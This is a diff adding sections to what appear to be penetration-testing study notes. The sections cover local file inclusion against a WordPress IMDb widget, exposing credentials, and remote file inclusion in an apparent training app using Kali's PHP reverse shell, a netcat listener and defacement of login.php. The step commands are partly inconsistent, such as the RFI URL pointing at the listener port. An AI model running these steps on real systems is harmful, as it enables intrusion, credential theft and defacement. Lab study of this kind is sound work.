@@ -96,3 +96,41 @@
 ### 7.6. LFI basics
 
 1. You should be able to go with files located directly in /var/www/html (because it's where files are server) or with directory traversal → ```/var/www/html/phpinfo.php``` or ```../../../../../var/www/html/phpinfo.php```
+
+### 7.7. WordPress IMDb Widget LFI
+
+1. First, perform a scan  → ```wpscan --url url```
+2. Execute searchsploit to browse information → ```searchsploit imdb```
+3. Copy the file from the path column to the desktop → ```/usr/share/exploitdb/exploits/php/webapps/39621.txt ./39621.txt```
+  - Then read it with cat. In the vuln part you have the vulnerable code
+  - Then the PoC shows the directory traversal towards the file that is included
+4. Below, you can find next step → right click, save and change the extension to php
+  - The php code is not executed in the inclusion, as it's being read as an image
+5. Execute → ```wget + full url with LFI -O output.txt```
+  - It's just another way to get the content (apart from changing the extension to the downloaded image)
+  - The content shows sensitive information, such as usernames and credentials
+
+### 7.8. RFI inclusion basics
+
+1. Check the ip with → ```ifconfig```
+2. Navigate → OWASP 2017/Broken access control/Insecure direct object references/RFI
+  - The url will show an external resource
+3. Kali Linux prepackaged with reverse shells in the webshells directory → ```ls -la /usr/share/webshells/php/```
+4. Copy the php reverse shell → ```cp /usr/share/webshells/php/php-reverse-shell.php .```
+5. Rename it 
+6. Edit it → ```vim shell.php```
+7. In the ip parameter → ```ip of current system```
+  - Write and save
+8. You need 2 things now → a web server to host the php and a netcat listener
+  - Web server → ```python -m SimpleHTTPServer 80``` (start it in the same directory as shell.php)
+  - Configure the netcat listener in another tab → ```nc -nlvp 1234```
+9. Go to the url parameter and inject the RFI → ```http://x.x.x.x:1234/shell.php```
+  - In the netcat tab you will have the reverse shell
+10. To prove you are in the victim's server
+  - Execute → ```/bin/bash -i``` to spawn a bash session
+  - Cat the current system release → ```cat /etc/*release```
+  - CD to the web server files directory → ```cd /var/www/html```
+  - Inject html into the login.php page → ```echo "<h1>Surprise!</h1>" >> login.php```
+
+
+
